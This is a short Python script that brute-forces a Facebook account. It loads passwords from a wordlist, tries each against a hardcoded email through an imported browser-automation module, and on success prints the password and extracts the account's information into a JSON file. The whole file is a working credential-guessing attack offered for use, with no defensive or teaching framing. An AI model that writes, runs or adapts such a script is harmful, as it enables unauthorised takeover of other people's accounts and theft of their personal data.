from facebook import *


email = "test@gmail.com"
passwords = []
found = False

with open("wordlist", "r") as f:
    lines = f.readlines()
    f.close()

for line in lines:
    if line.endswith("\n"):
        passwords.append(line[:-1])
    else:
        passwords.append(line)

print("Trying To Brute Force Facebook With Email : ", email)

brute = Facebook(gui="no")


for passwd in passwords:

    if brute.login(email, passwd) == 200:
        print(passwd, "===> Correct")
        brute.extract_info_to("fb.json")
        if brute.gui == "no":
            brute.br.quit()
        found = True
        break
    else:
        print(passwd, "===> Wrong")

if not found:
    brute.br.quit()
